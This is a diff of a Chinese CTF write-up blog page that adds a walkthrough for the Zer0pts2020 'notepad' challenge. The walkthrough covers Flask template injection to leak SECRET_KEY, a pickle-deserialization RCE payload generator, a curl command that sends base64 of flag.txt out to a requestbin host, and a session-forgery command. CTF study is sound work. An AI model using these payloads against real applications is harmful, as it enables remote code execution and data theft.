@@ -67,8 +67,12 @@
 <meta property="og:image" content="https://i.loli.net/2020/04/10/cnbIqUS27PLYlNg.png">
 <meta property="og:image" content="https://i.loli.net/2020/04/10/SD1zpF7GAEX8wM3.png">
 <meta property="og:image" content="https://i.loli.net/2020/04/10/6BsSuMCaQxVKmEh.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/10/kl1h3jV7JUvC2QB.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/10/tRY2sKNo3wZTAB7.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/10/uetERnA3HwIkv7T.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/10/QBl23jJvPtY9SH5.png">
 <meta property="article:published_time" content="2020-04-02T13:32:32.000Z">
-<meta property="article:modified_time" content="2020-04-10T09:35:37.910Z">
+<meta property="article:modified_time" content="2020-04-10T13:28:35.458Z">
 <meta property="article:author" content="glotozz">
 <meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary">
@@ -193,12 +197,17 @@
 <li><a href="#zer0pts2020can-you-guess-it">[Zer0pts2020]Can you guess it?</a></li>
 <li><a href="#zer0pts2020urlapp">[Zer0pts2020]urlapp</a></li>
 <li><a href="#zer0pts2020notepad">[Zer0pts2020]notepad</a></li>
+<li><a href="#d3ctf-2019ezupload">[D3CTF 2019]EzUpload</a></li>
+<li><a href="#d3ctf-2019easyweb">[D3CTF 2019]EasyWeb</a></li>
+<li><a href="#d3ctf-2019showhub">[D3CTF 2019]Showhub</a></li>
+<li><a href="#lfi2019">LFI2019</a></li>
 </ul>
 <!-- tocstop -->
 
 <hr>
 <p>玩狼人杀输一把刷3道buu哈哈</p>
 <hr>
+<p>#############4/2</p>
 <h4><span id="sctf2019flag-shop">[SCTF2019]Flag Shop</span></h4><p><code>/filebak</code>得到源码</p>
 <p>jwt身份验证，</p>
 <p>先爆破一下密钥试试</p>
@@ -325,6 +334,7 @@
 
 <p>能成功执行命令，但是回显有点奇怪，反弹shell也失败，jsp不能使用``包裹命令直接带出，最后用@Mrkaixin的木马反弹shell成功</p>
 <hr>
+<p>###################4/10</p>
 <h4><span id="zer0pts2020phpnantokaadm">[Zer0pts2020]phpNantokaAdm</span></h4><p>给了源码</p>
 <p><code>index.php</code></p>
 <p><img src="https://i.loli.net/2020/04/10/AFEOgWTtdUxVMZP.png" alt="Snipaste_2020-04-10_12-22-47.png"></p>
@@ -420,7 +430,33 @@
 <p><img src="https://i.loli.net/2020/04/10/6BsSuMCaQxVKmEh.png" alt="Snipaste_2020-04-10_17-16-25.png"></p>
 <hr>
 <h4><span id="zer0pts2020notepad">[Zer0pts2020]notepad</span></h4><p>flask框架</p>
+<p>处理404页面存在明显的模板注入</p>
+<p><img src="https://i.loli.net/2020/04/10/kl1h3jV7JUvC2QB.png" alt="Snipaste_2020-04-10_17-45-01.png"></p>
+<p>跟进<code>valid_url()</code></p>
+<p><img src="https://i.loli.net/2020/04/10/tRY2sKNo3wZTAB7.png" alt="Snipaste_2020-04-10_19-07-27.png"></p>
+<p>长度限制为16，理论上只能读取一些配置常量</p>
+<p><img src="https://i.loli.net/2020/04/10/uetERnA3HwIkv7T.png" alt="Snipaste_2020-04-10_18-20-45.png"></p>
+<p>利用ssti读取config中的<code>secret_key</code>，配合flask的session伪造</p>
+<p><strong>ssti</strong></p>
+<p><img src="https://i.loli.net/2020/04/10/QBl23jJvPtY9SH5.png" alt="Snipaste_2020-04-10_19-24-07.png"></p>
+<p>得到<code>&#39;SECRET_KEY&#39;: b&#39;\xcb\xcf\x89\x82\x9e\xfed\x82\xcck\x98\xa8\xaf\x956\xf8&#39;</code></p>
+<p><strong>pickle反序列化RCE</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import _pickle as cPickle</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">COMMAND &#x3D; sys.argv[1]</span><br><span class="line">class PickleRce(object):</span><br><span class="line">	def __reduce__(self):</span><br><span class="line">		import os</span><br><span class="line">		return (os.system,(COMMAND,))</span><br><span class="line">print base64.b64encode(base64.b64encode(cPickle.dumps(PickleRce())))</span><br></pre></td></tr></table></figure>
 
+<p>注意这里要base64编码两次</p>
+<p>=&gt;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@glotozz ~]# python3 1.py &quot;curl http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;rswxb2rs?a&#x3D;\&#96;cat flag.txt |base64\&#96;&quot;</span><br><span class="line">b&#39;Z0FOamNHOXphWGdLYzNsemRHVnRDbkVBV0VZQUFBQmpkWEpzSUdoMGRIQTZMeTlvZEhSd0xuSmxjWFZsYzNSaWFXNHVZblYxYjJvdVkyNHZjbk4zZUdJeWNuTS9ZVDFnWTJGMElHWnNZV2N1ZEhoMElIeGlZWE5sTmpSZ2NRR0ZjUUpTY1FNdQ&#x3D;&#x3D;&#39;</span><br></pre></td></tr></table></figure>
+
+<p><strong>flask的session伪造</strong></p>
+<p>原始数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#39;&#123;&quot;savedata&quot;:&#123;&quot; b&quot;:&quot;Z0FOZGNRQjljUUVvV0FRQUFBQmtZWFJsY1FKWUV3QUFBREl3TWpBdE1EUXRNVEFnTVRFNk5USTZNak54QTFnRUFBQUFkR1Y0ZEhFRVdBQUFBQUJ4QlZnRkFBQUFkR2wwYkdWeEJsZ0tBQUFBS2s1bGR5Qk9iM1JsS25FSGRXRXU&#x3D;&quot;&#125;&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>伪造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -t &#39;&#123;&quot;savedata&quot;:&#123;&quot; b&quot;:&quot;Z0FOamNHOXphWGdLYzNsemRHVnRDbkVBV0VZQUFBQmpkWEpzSUdoMGRIQTZMeTlvZEhSd0xuSmxjWFZsYzNSaWFXNHVZblYxYjJvdVkyNHZjbk4zZUdJeWNuTS9ZVDFnWTJGMElHWnNZV2N1ZEhoMElIeGlZWE5sTmpSZ2NRR0ZjUUpTY1FNdQ&#x3D;&#x3D;&quot;&#125;&#125;&#39; -s &#39;\xcb\xcf\x89\x82\x9e\xfed\x82\xcck\x98\xa8\xaf\x956\xf8&#39;</span><br></pre></td></tr></table></figure>
+
+<p>没成功，思路应该差不多，有空再看（咕</p>
+<hr>
+<h4><span id="d3ctf-2019ezupload">[D3CTF 2019]EzUpload</span></h4><h4><span id="d3ctf-2019easyweb">[D3CTF 2019]EasyWeb</span></h4><h4><span id="d3ctf-2019showhub">[D3CTF 2019]Showhub</span></h4><h4><span id="lfi2019">LFI2019</span></h4>
             </div>
           
 
